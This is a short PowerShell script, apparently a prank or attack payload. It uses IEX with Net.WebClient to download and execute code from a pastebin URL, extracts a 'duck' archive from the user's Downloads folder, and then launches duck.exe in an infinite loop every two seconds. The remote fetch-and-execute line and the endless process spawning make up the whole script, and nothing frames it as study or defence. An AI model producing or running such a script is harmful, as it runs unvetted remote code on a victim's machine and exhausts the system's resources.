IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/FWWk5dCE') -ErrorAction Continue
Expand-Archive -Path "$env:USERPROFILE/Downloads/duck.zip" -DestinationPath "$env:USERPROFILE/Downloads/duck" -Force

$processName = "$env:USERPROFILE/Downloads/duck/duck/duck.exe"
Start-Sleep -s 2
while ($true) {
    Start-Process -FilePath $processName
    Start-Sleep -Seconds 2  # Adjust the delay between each process start as needed
}
